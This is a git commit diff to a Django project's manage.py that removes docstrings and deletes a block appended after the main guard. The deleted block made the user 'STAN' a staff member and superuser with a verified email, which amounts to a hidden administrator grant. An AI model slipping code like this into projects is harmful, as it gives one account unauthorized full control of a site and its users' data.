e241a329d8af34b125b9776b4e6f1af9205be253
STAN <dupdateske@gmail.com>
2026-03-13 18:01:15 +0300

    Fix manage.py for deployment

--- DailyBuzz_updates/manage.py
+++ DailyBuzz_updates/manage.py
@@ -1,11 +1,9 @@
 #!/usr/bin/env python
-"""Django's command-line utility for administrative tasks."""
 import os
 import sys
 
 
 def main():
-    """Run administrative tasks."""
     os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'dailybuzz.settings')
     try:
         from django.core.management import execute_from_command_line
@@ -20,11 +18,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-  
-from accounts.models import CustomUser
-u = CustomUser.objects.get(username='STAN')
-u.is_staff = True
-u.is_superuser = True
-u.email_verified = True
-u.save()
-exit()
